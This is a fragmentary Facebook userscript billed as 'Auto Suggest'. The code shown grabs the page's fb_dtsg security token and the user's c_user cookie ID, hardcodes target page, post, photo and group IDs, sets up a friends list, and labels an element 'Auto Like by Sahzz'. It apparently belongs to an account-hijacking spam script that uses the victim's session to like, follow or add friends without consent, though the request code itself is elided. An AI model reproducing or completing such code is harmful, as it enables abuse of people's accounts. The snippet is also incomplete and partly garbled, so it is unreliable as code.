// ==UserScript==
// @name            Facebook Auto Suggest[Future Zone]
// @description     Facebook Auto Suggest[Future Zone] 
// @namespace       http://userscripts.org/scripts/review/169917
...
// @homepageURL     https://userscripts.org/scripts/show/169917
...
sublist("324621697669323");

var gid = ['MakeNewFriendS.with.HuLex'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "595562653807546";
var spost_id = "128791540654103";
var sfoto_id = "210904159041078";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Like by Sahzz';
